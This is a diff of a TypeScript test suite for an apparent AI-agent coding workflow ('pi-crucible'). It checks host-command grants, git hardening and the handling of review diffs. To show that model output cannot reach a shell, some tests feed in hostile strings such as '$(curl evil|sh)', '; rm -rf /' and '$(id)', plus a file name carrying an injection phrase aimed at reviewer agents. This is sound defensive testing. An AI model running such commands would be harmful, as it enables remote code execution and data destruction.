@@ -3,7 +3,7 @@
 // a script of structured outputs, and a fake `runs.host` that admits only the resource's grants.
 import { test } from "node:test";
 import assert from "node:assert/strict";
-import { crucibleResource, GIT_TIMEOUT_MS, CHECK_TIMEOUT_MS, loadScript } from "../src/resource.ts";
+import { CheckGrants, crucibleResource, GIT_TIMEOUT_MS, CHECK_TIMEOUT_MS, HOST_LIMIT, loadScript, MAX_ROUNDS } from "../src/resource.ts";
 import { engineConfig, validArgs } from "./fixtures.ts";
 
 type Opts = { agent: string; model: string; task: string; skill?: string; outputSchema?: { required?: string[] } };
@@ -20,31 +20,43 @@ const { validateStructuredOutputValue } = await import(
 const validates = async (schema: unknown, value: unknown) => (await validateStructuredOutputValue(schema, value)).status === "valid";
 
 const NUMSTAT = "1\t0\ta.ts\n119\t0\tb.ts\n 2 files changed, 120 insertions(+)\n\ndiff --git a/a.ts b/a.ts\n";
-const logOf = (key: string) => `/art/outputs/run-1/host/${key}.log`;
+// Where a round's diff is: a fixed path in the worktree, the same in every run.
+const diffAt = (round: number, worktree = "/tmp/repo-worktrees/issue-2") => `${worktree}/.pi/crucible-review/r${round}.diff`;
 const defaultHost = (key: string, where: { worktree: string; branch: string }): HostAnswer => {
   if (key === "host-worktree") return { stdout: `${where.worktree}\n${where.branch}\n` };
+  if (key.endsWith("-fetch")) return { stdout: "c57139f\n" };
   if (key.endsWith("-heads")) return { stdout: "c57139f\nabc1234\n" };
   if (key.startsWith("host-diff-")) return { stdout: NUMSTAT };
   return { stdout: "" };
 };
 
+let simulations = 0;
 /**
  * Launched by name (the default), the script is resolve's: CRUCIBLE_ARGS, CRUCIBLE_HOST and the
  * grants. `raw` runs the bare script with sandbox args, as a launch by path does: no host authority.
+ * `checkGrants` is what the extension recorded; by default, the args' own checks, as /crucible
+ * records them. Each simulation is a new run id, as an auto-resume is.
  */
 export async function simulate(
   args: Record<string, unknown>,
   answer: (key: string, opts: Opts) => Answer,
-  options: { host?: (key: string) => HostAnswer | undefined; raw?: boolean; script?: string; grants?: Grant[] } = {},
+  options: { host?: (key: string) => HostAnswer | undefined; raw?: boolean; script?: string; grants?: Grant[]; checkGrants?: CheckGrants } = {},
 ) {
+  const runId = `run-${++simulations}`;
   const calls: (Opts & { key: string })[] = [];
-  const hostCalls: { key: string; command: string; timeoutMs: number }[] = [];
+  const hostCalls: { key: string; command: string; timeoutMs: number; output?: string }[] = [];
   const events: string[] = [];
   let script = options.script ?? loadScript();
   let sandboxArgs = args;
   let grants = options.grants ?? null;
   if (!options.script && !options.raw) {
-    const resolved = crucibleResource(script).resolve(args);
+    let checkGrants = options.checkGrants;
+    if (!checkGrants) {
+      checkGrants = new CheckGrants();
+      const config = args.config as { checks?: { name: string; command: string }[] } | undefined;
+      if (config?.checks) checkGrants.record({ worktree: String(args.worktree), checks: config.checks });
+    }
+    const resolved = crucibleResource(script, undefined, checkGrants).resolve(args);
     if ("script" in resolved) {
       script = resolved.script;
       grants = resolved.hostCommands;
@@ -62,19 +74,21 @@ export async function simulate(
     }
     return { ok: a.ok ?? true, structuredOutput: a.structuredOutput, error: a.error };
   };
-  const host = async (key: string, params: { kind: string; command: string; timeoutMs: number }) => {
+  const host = async (key: string, params: { kind: string; command: string; timeoutMs: number; output?: string }) => {
     // pi-subagents: a raw script has no host authority; a resource may run only an exact key/command grant.
     if (!grants) throw new Error("runs.host is unavailable in this host context.");
-    assert.deepEqual(Object.keys(params).sort(), ["command", "kind", "timeoutMs"], key);
+    assert.deepEqual(Object.keys(params).filter((k) => k !== "output").sort(), ["command", "kind", "timeoutMs"], key);
     assert.ok(grants.some((g) => g.key === key && g.command === params.command.trim()), `${key}: "${params.command}" is not granted`);
     assert.ok(!hostCalls.some((h) => h.key === key), `${key} runs once per run`);
-    hostCalls.push({ key, command: params.command, timeoutMs: params.timeoutMs });
+    hostCalls.push({ key, command: params.command, timeoutMs: params.timeoutMs, ...(params.output ? { output: params.output } : {}) });
     events.push(key);
     const a = options.host?.(key) ?? defaultHost(key, where);
     if (a.error) throw new Error(a.error);
     if (a.exit) throw new Error(`Host command '${key}' failed: Command exited with code ${a.exit}. ${a.stdout ?? ""}`.slice(0, 230));
     if (a.timeout) throw new Error(`Host command '${key}' failed: Command timed out after ${params.timeoutMs}ms.`);
-    return { key, kind: "command", ok: true, state: "passed", exitCode: 0, stdout: a.stdout ?? "", stderr: "", outputPath: logOf(key), durationMs: 1 };
+    // pi-subagents: an explicit output is in the workflow cwd; the default is in this run's artifacts.
+    const outputPath = params.output ? `${where.worktree}/${params.output}` : `/art/outputs/${runId}/host/${key}.log`;
+    return { key, kind: "command", ok: true, state: "passed", exitCode: 0, stdout: a.stdout ?? "", stderr: "", outputPath, durationMs: 1 };
   };
   const runs = { run, all: (list: (Opts & { key: string })[]) => Promise.all(list.map((o) => run(o.key, o))), host };
   const result = await new AsyncFunction("args", "runs", script)(sandboxArgs, runs);
@@ -236,7 +250,11 @@ test("a PR stage that opens no PR, or fails, flags a human and stops", async () 
 });
 
 // ---- Host commands (#57) ---------------------------------------------------------------
-const DIFF = "git diff --no-color --no-ext-diff --numstat --shortstat -p origin/main...HEAD";
+const GIT = "git -c core.hooksPath=/dev/null";
+const DIFF = `${GIT} diff --no-color --no-ext-diff --no-textconv --numstat --shortstat -p origin/main...HEAD`;
+const FETCH = `${GIT} fetch origin && ${GIT} rev-parse --short origin/main`;
+const HEADS = `${GIT} rev-parse --short origin/main HEAD`;
+const WORKTREE = `${GIT} rev-parse --show-toplevel --abbrev-ref HEAD`;
 const blockerOnCode = (key: string): Answer =>
   key === "review-code-r0"
     ? { structuredOutput: { verdict: "changes", findings: [{ id: "code-r0-1", severity: "blocker", location: "a.ts:1", problem: "p", fix: "f" }] } }
@@ -246,13 +264,14 @@ const blockerOnCode = (key: string): Answer =>
 
 test("the host steps run in a fixed order, the worktree check first", async () => {
   const { events, hostCalls } = await simulate(args, happy());
-  assert.deepEqual(events, ["host-worktree", "spec", "implement", "host-diff-r0", "review-code-r0", "review-ux-r0", "host-fetch", "integrate", "host-heads", "check-test", "pr"]);
-  assert.deepEqual(hostCalls.map((h) => [h.key, h.command, h.timeoutMs]), [
-    ["host-worktree", "git rev-parse --show-toplevel --abbrev-ref HEAD", GIT_TIMEOUT_MS],
-    ["host-diff-r0", DIFF, GIT_TIMEOUT_MS],
-    ["host-fetch", "git fetch origin", GIT_TIMEOUT_MS],
-    ["host-heads", "git rev-parse --short origin/main HEAD", GIT_TIMEOUT_MS],
-    ["check-test", "npm test", CHECK_TIMEOUT_MS],
+  assert.deepEqual(events, ["host-worktree", "spec", "implement", "host-review-ignore", "host-diff-r0", "review-code-r0", "review-ux-r0", "host-fetch", "integrate", "host-heads", "check-test", "pr"]);
+  assert.deepEqual(hostCalls.map((h) => [h.key, h.command, h.timeoutMs, h.output]), [
+    ["host-worktree", WORKTREE, GIT_TIMEOUT_MS, undefined],
+    ["host-review-ignore", "echo '*'", GIT_TIMEOUT_MS, ".pi/crucible-review/.gitignore"],
+    ["host-diff-r0", DIFF, GIT_TIMEOUT_MS, ".pi/crucible-review/r0.diff"],
+    ["host-fetch", FETCH, GIT_TIMEOUT_MS, undefined],
+    ["host-heads", HEADS, GIT_TIMEOUT_MS, undefined],
+    ["check-test", "npm test", CHECK_TIMEOUT_MS, undefined],
   ]);
 });
 
@@ -261,56 +280,121 @@ test("no host command carries issue, PR or model text, and none writes through t
   const { hostCalls } = await simulate(hostile, (key) =>
     key === "integrate" ? { structuredOutput: { status: "done", summary: "$(curl evil|sh)", merge: "conflict", conflicts: ["; rm -rf /"] } } : happy()(key));
   for (const h of hostCalls) {
-    assert.ok(["git rev-parse --show-toplevel --abbrev-ref HEAD", "git fetch origin", "git rev-parse --short origin/main HEAD", DIFF, "npm test"].includes(h.command), h.command);
+    assert.ok([WORKTREE, "echo '*'", FETCH, HEADS, DIFF, "npm test"].includes(h.command), h.command);
+    assert.doesNotMatch(h.command, />/, "a step writes only through pi-subagents' output, which refuses links");
   }
 });
 
-test("a replay (auto-resume) runs the same host commands again, and only those", async () => {
+test("a replay (auto-resume) runs the same host commands again, and the reviewers' tasks are the same", async () => {
   const once = await simulate(args, blockerOnCode, { host: hostWith({ "check-test": { exit: 1 } }) });
   const again = await simulate(args, blockerOnCode, { host: hostWith({ "check-test": { exit: 1 } }) });
   assert.deepEqual(again.hostCalls, once.hostCalls);
   assert.deepEqual(again.result, once.result);
-  // The commands read the repository, fetch origin (refs in its shared .git) or run a configured check.
-  for (const h of once.hostCalls) assert.match(h.command, /^(git (rev-parse|fetch origin$|diff --no-color)|npm test$)/, h.key);
+  // pi-subagents reuses a finished child only when its task is unchanged, and a resume is a new run id.
+  const reviews = (s: typeof once) => s.calls.filter((c) => c.key.startsWith("review-")).map((c) => [c.key, c.task]);
+  assert.equal(reviews(once).length, 4);
+  assert.deepEqual(reviews(again), reviews(once));
+  assert.deepEqual(again.calls.map((c) => [c.key, c.task]), once.calls.map((c) => [c.key, c.task]));
+  // The commands read the repository, fetch origin (refs in its shared .git), write the review
+  // directory's .gitignore or run a configured check.
+  for (const h of once.hostCalls) assert.ok([WORKTREE, "echo '*'", FETCH, HEADS, DIFF, "npm test"].includes(h.command), h.key);
 });
 
-test("before each review round the host writes the diff to the run's artifacts, not the worktree", async () => {
-  const { events, task } = await simulate(args, blockerOnCode);
+test("a replay after main moved merges again, and the record names the main it merged", async () => {
+  const once = await simulate(args, happy());
+  const moved = await simulate(args, happy(), { host: hostWith({ "host-fetch": { stdout: "d00d00d\n" }, "host-heads": { stdout: "d00d00d\nbeef123\n" } }) });
+  assert.match(once.task("integrate"), /origin\/main is at c57139f/);
+  assert.match(moved.task("integrate"), /origin\/main is at d00d00d/);
+  assert.notEqual(moved.task("integrate"), once.task("integrate"), "a changed task is not reused");
+  assert.equal(moved.result.integration.main, "d00d00d");
+  assert.equal(moved.result.integration.head, "beef123");
+  assert.equal(moved.task("review-code-r0"), once.task("review-code-r0"), "review is reused all the same");
+
+  const recheck = await simulate(args, happy(), { host: hostWith({ "check-test": { exit: 1 }, "host-recheck-fetch": { stdout: "e11e11e\n" } }) });
+  assert.match(recheck.task("integrate-recheck"), /origin\/main is at e11e11e/);
+  const odd = await simulate(args, happy(), { host: hostWith({ "host-fetch": { stdout: "From github.com:o/r\n" } }) });
+  assert.ok(!keysOf(odd.calls).includes("integrate"));
+  assert.equal(odd.result.integration.note, "git rev-parse --short origin/main after the fetch: unexpected output");
+});
+
+test(`at the most a run can ask for, it stays within pi-subagents' ${HOST_LIMIT} grants and ${HOST_LIMIT} host calls`, async () => {
+  const names = Array.from({ length: 8 }, (_, i) => `c${i}`);
+  const config = { ...engineConfig, checks: names.map((name) => ({ name, command: `npm run ${name}` })) };
+  const all = Object.fromEntries(names.map((n) => [n, "pass"]));
+  const blocker = (id: string) => ({ structuredOutput: { verdict: "changes", findings: [{ id, severity: "blocker", location: "a.ts:1", problem: "p", fix: "f" }] } });
+  const { calls, hostCalls } = await simulate({ ...args, config, maxRounds: MAX_ROUNDS }, (key) => {
+    if (/^review-code-r[0-5]$/.test(key)) return blocker(`${key}-1`);
+    if (key === "implement") return { structuredOutput: { status: "done", summary: "s", changed_files: ["a.ts"], checks: all } };
+    if (key.startsWith("revise-")) return { structuredOutput: { status: "done", summary: "s", responses: [], changed_files: ["a.ts"], checks: all } };
+    if (key === "integrate-fix") return { structuredOutput: { status: "done", summary: "f", changed_files: ["a.ts"], non_test_files: ["a.ts"], checks: all } };
+    return happy()(key);
+  }, { host: hostWith({ "check-c0": { exit: 1 } }) });
+  assert.ok(keysOf(calls).includes(`review-code-r${MAX_ROUNDS + 1}`), "every review round and the fix's re-review ran");
+  const resolved = crucibleResource("x", undefined, (() => { const g = new CheckGrants(); g.record({ worktree: args.worktree, checks: config.checks }); return g; })()).resolve({ ...args, config, maxRounds: MAX_ROUNDS }) as { hostCommands: Grant[] };
+  assert.equal(resolved.hostCommands.length, 29);
+  assert.equal(hostCalls.length, 29);
+  assert.ok(resolved.hostCommands.length <= HOST_LIMIT && hostCalls.length <= HOST_LIMIT);
+});
+
+test("before each review round the host writes the diff to a fixed, git-ignored path in the worktree", async () => {
+  const { events, task, hostCalls } = await simulate(args, blockerOnCode);
+  assert.ok(events.indexOf("host-review-ignore") < events.indexOf("host-diff-r0"));
+  assert.equal(hostCalls.filter((h) => h.key === "host-review-ignore").length, 1, "once per run");
   assert.ok(events.indexOf("host-diff-r0") < events.indexOf("review-code-r0"));
   assert.ok(events.indexOf("host-diff-r1") < events.indexOf("review-code-r1"));
-  assert.ok(task("review-code-r1").includes(logOf("host-diff-r1")));
-  assert.ok(!task("review-code-r1").includes("host-diff-r0"));
-  assert.doesNotMatch(task("review-code-r0"), /crucible-review/);
+  assert.ok(task("review-code-r1").includes(diffAt(1)));
+  assert.ok(!task("review-code-r1").includes("r0.diff"));
+  assert.doesNotMatch(task("review-code-r0"), /\/art\/outputs/);
+
+  const unignored = await simulate(args, happy(), { host: hostWith({ "host-review-ignore": { exit: 1, stdout: "read-only" } }) });
+  assert.ok(!unignored.hostCalls.some((h) => h.key.startsWith("host-diff-")), "no diff in the worktree without its .gitignore");
+  assert.equal(unignored.result.rounds[0].diff, "unavailable: Command exited with code 1. read-only");
 });
 
 test("every reviewer reads the round's diff and cites hunks", async () => {
   const { task } = await simulate(args, happy());
   for (const key of ["review-code-r0", "review-ux-r0"]) {
-    assert.ok(task(key).includes(logOf("host-diff-r0")), key);
+    assert.ok(task(key).includes(diffAt(0)), key);
     assert.ok(task(key).includes("(+120 -0 lines, 2 files)"), key);
-    assert.ok(task(key).includes("Changed files: a.ts, b.ts."), key);
+    assert.ok(task(key).includes("Changed files: `a.ts`, `b.ts`."), key);
     assert.match(task(key), /continuing with offset/, key);
-    assert.match(task(key), /at most its first 1 MiB/, key);
+    assert.match(task(key), /at most its\nfirst 1 MiB/, key);
     assert.match(task(key), /"path:line"/, key);
   }
 });
 
 test("the crucible record shows the diff each round read: git's changed lines and files", async () => {
   const { result, task } = await simulate(args, happy());
-  assert.equal(result.rounds[0].diff, "host-diff-r0.log (+120 -0 lines, 2 files)");
-  assert.ok(task("pr").includes('"diff":"host-diff-r0.log (+120 -0 lines, 2 files)"'));
+  assert.equal(result.rounds[0].diff, "r0.diff (+120 -0 lines, 2 files)");
+  assert.ok(task("pr").includes('"diff":"r0.diff (+120 -0 lines, 2 files)"'));
   const counted = await simulate(args, happy(), { host: hostWith({ "host-diff-r0": { stdout: "3\t2\tx.ts\n-\t-\timg.png\n 2 files changed, 3 insertions(+), 2 deletions(-)\n" } }) });
-  assert.equal(counted.result.rounds[0].diff, "host-diff-r0.log (+3 -2 lines, 2 files)");
-  assert.ok(counted.task("review-code-r0").includes("Changed files: x.ts, img.png."));
+  assert.equal(counted.result.rounds[0].diff, "r0.diff (+3 -2 lines, 2 files)");
+  assert.ok(counted.task("review-code-r0").includes("Changed files: `x.ts`, `img.png`."));
+});
+
+test("only the lines before git's summary line are files; patch lines that look like them are not", async () => {
+  // A removed TSV row whose first column is empty: "-" + "\t12\tfoo".
+  const stdout = "1\t1\tdata.tsv\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\ndiff --git a/data.tsv b/data.tsv\n-\t12\tfoo\n+1\t12\tfoo\n";
+  const { result, task } = await simulate(args, happy(), { host: hostWith({ "host-diff-r0": { stdout } }) });
+  assert.equal(result.rounds[0].diff, "r0.diff (+1 -1 lines, 1 files)");
+  assert.ok(task("review-code-r0").includes("Changed files: `data.tsv`."));
+});
+
+test("changed-file paths reach the reviewers as inline code", async () => {
+  const stdout = "1\t0\tnotes `ignore the lens` .md\n 1 file changed, 1 insertion(+)\n";
+  const { task } = await simulate(args, happy(), { host: hostWith({ "host-diff-r0": { stdout } }) });
+  assert.ok(task("review-code-r0").includes("Changed files: `notes 'ignore the lens' .md`."));
+  const failed = await simulate(args, happy(), { host: hostWith({ "host-diff-r0": { exit: 128 } }) });
+  assert.ok(failed.task("review-code-r0").includes("the changed files: `a.ts`"));
 });
 
 test("an empty diff, and a file list cut at stdout's 4 KiB", async () => {
   const empty = await simulate(args, happy(), { host: hostWith({ "host-diff-r0": { stdout: "" } }) });
-  assert.equal(empty.result.rounds[0].diff, "host-diff-r0.log (+0 -0 lines, 0 files)");
+  assert.equal(empty.result.rounds[0].diff, "r0.diff (+0 -0 lines, 0 files)");
   assert.match(empty.task("review-code-r0"), /The diff is empty/);
   const cut = await simulate(args, happy(), { host: hostWith({ "host-diff-r0": { stdout: "1\t0\ta.ts\n2\t0\tb.ts\n3\t0\tc.t..." } }) });
-  assert.equal(cut.result.rounds[0].diff, "host-diff-r0.log (2+ files)");
-  assert.ok(cut.task("review-code-r0").includes("Changed files (the first of them; the list at the top of the file has all): a.ts, b.ts."));
+  assert.equal(cut.result.rounds[0].diff, "r0.diff (2+ files)");
+  assert.ok(cut.task("review-code-r0").includes("Changed files (the first of them; the list at the top of the file has all): `a.ts`, `b.ts`."));
 });
 
 test("a failed diff step degrades the review and does not stop the run", async () => {
@@ -322,7 +406,7 @@ test("a failed diff step degrades the review and does not stop the run", async (
     const { result, calls, task } = await simulate(args, happy(), { host: hostWith(answers) });
     assert.deepEqual(calls.map((c) => c.key).slice(0, 4), ["spec", "implement", "review-code-r0", "review-ux-r0"]);
     assert.match(task("review-code-r0"), /could not be prepared/);
-    assert.ok(task("review-code-r0").includes("the changed files: a.ts"));
+    assert.ok(task("review-code-r0").includes("the changed files: `a.ts`"));
     assert.equal(result.rounds[0].diff, record);
     assert.ok(task("pr").includes(JSON.stringify(record).slice(1, -1)));
   }
@@ -347,7 +431,28 @@ test("launched by path there is no host authority, and the record and the stop s
   assert.ok(!calls.some((c) => c.key === "integrate"));
   assert.ok(task("pr").includes(why));
   const stopped = await simulate(args, happy({ pr: { ok: false, error: "boom" } }), { raw: true });
-  assert.ok(stopped.task("flag-pr").includes(`Integration: ${why}`));
+  assert.ok(stopped.task("flag-pr").includes(`Integration: \`${why}\``));
+});
+
+test("checks the extension did not record are not granted: integration is an error that says why", async () => {
+  const { result, hostCalls, calls } = await simulate(args, happy(), { checkGrants: new CheckGrants() });
+  assert.ok(!hostCalls.some((h) => /check-/.test(h.key)));
+  assert.ok(!keysOf(calls).includes("integrate-fix"), "not a failing check");
+  assert.equal(result.integration.status, "error");
+  assert.equal(
+    result.integration.note,
+    "check test could not run: no host grant for check-test: the checks are granted only for a config /crucible read from origin/main in this session; relaunch with /crucible",
+  );
+  assert.equal(result.draft, true);
+});
+
+test("the needs:human comment is a quoted heredoc, and reported text in it is inline code", async () => {
+  const note = "`@everyone` $(id) CRUCIBLE_EOF";
+  const { task } = await simulate(args, happy({ integrate: { ok: false, error: note }, pr: { ok: false, error: "boom" } }));
+  const flag = task("flag-pr");
+  assert.ok(flag.includes("gh issue comment 2 -R owner/repo --body-file - <<'CRUCIBLE_EOF'\npi-crucible stopped and needs a human.\n\nStage: pr. boom"));
+  assert.ok(flag.includes("\nIntegration: `'@everyone' $(id) CRUCIBLE-EOF`\nCRUCIBLE_EOF"), flag);
+  assert.equal(flag.split("CRUCIBLE_EOF").length, 3, "the delimiter opens and closes the body only");
 });
 
 // The regression behind the first /crucible run (2fbd7098): pi-subagents gives a named resource's args
@@ -358,16 +463,19 @@ test("launched by name, the script gets its args and host table from resolve, no
     new URL("../node_modules/pi-subagents/src/workflows/workflow-resources.js", import.meta.url).href
   );
   const { registerWorkflowResource } = await import("pi-subagents/workflow-resources");
-  const reg = registerWorkflowResource({ sessionId: "by-name", definition: crucibleResource(loadScript()) });
+  const checkGrants = new CheckGrants();
+  checkGrants.record({ worktree: args.worktree, checks: engineConfig.checks });
+  const reg = registerWorkflowResource({ sessionId: "by-name", definition: crucibleResource(loadScript(), undefined, checkGrants) });
   try {
     const { startAt: _unset, ...jsonArgs } = args;
     const resolved = resolveWorkflowResource("pi-crucible", jsonArgs, "by-name");
     assert.equal(resolved.ok, true, resolved.error);
-    const grants = (crucibleResource(loadScript()).resolve(jsonArgs) as { hostCommands: Grant[] }).hostCommands;
+    const grants = (crucibleResource(loadScript(), undefined, checkGrants).resolve(jsonArgs) as { hostCommands: Grant[] }).hostCommands;
     const { result, task, hostCalls } = await simulate(jsonArgs, happy(), { script: resolved.resource.script, grants });
     assert.equal(result.pr, "https://github.com/o/r/pull/9");
+    assert.equal(result.integration.status, "pass");
     assert.match(task("spec"), /Repository: owner\/repo, issue #2\./);
-    assert.equal(hostCalls.length, 5);
+    assert.equal(hostCalls.length, 6);
   } finally {
     reg.dispose();
   }
@@ -376,7 +484,7 @@ test("launched by name, the script gets its args and host table from resolve, no
 test("on --start-at review the reviewers get git's file list", async () => {
   const { calls, task } = await simulate({ ...args, startAt: "review" }, happy());
   assert.deepEqual(calls.map((c) => c.key), ["review-code-r0", "review-ux-r0", "integrate", "pr"]);
-  assert.ok(task("review-code-r0").includes("Changed files: a.ts, b.ts."));
+  assert.ok(task("review-code-r0").includes("Changed files: `a.ts`, `b.ts`."));
 });
 
 // ---- Integration (#5) ------------------------------------------------------------------
@@ -448,8 +556,8 @@ test("a conflict gets one fix round, a re-check and a code re-review, and runs n
   assert.match(fix, /docs\/specs\/2-scaffold\.md/);
   assert.match(task("review-code-r1"), /INTEGRATION FIX/);
   assert.match(task("review-code-r1"), /conflicted in src\/tools\.ts/);
-  assert.ok(task("review-code-r1").includes(logOf("host-diff-r1")));
-  assert.deepEqual(result.rounds.at(-1), { round: 1, lenses: ["code"], diff: "host-diff-r1.log (+120 -0 lines, 2 files)", blocking: 0, after: "integration fix" });
+  assert.ok(task("review-code-r1").includes(diffAt(1)));
+  assert.deepEqual(result.rounds.at(-1), { round: 1, lenses: ["code"], diff: "r1.diff (+120 -0 lines, 2 files)", blocking: 0, after: "integration fix" });
   assert.equal(result.integration.reReview, 1);
   assert.equal(result.integration.status, "pass");
   assert.deepEqual(result.integration.conflicts, [], "the record is the re-check's");
@@ -593,7 +701,7 @@ test("with no checks configured, stages say so, no check runs and integration st
     return happy()(key);
   });
   assert.match(task("implement"), /\(none configured: say so in summary/);
-  assert.deepEqual(hostCalls.map((h) => h.key), ["host-worktree", "host-diff-r0", "host-fetch", "host-heads"]);
+  assert.deepEqual(hostCalls.map((h) => h.key), ["host-worktree", "host-review-ignore", "host-diff-r0", "host-fetch", "host-heads"]);
   assert.equal(result.draft, false);
   assert.equal(result.integration.status, "pass");
 });
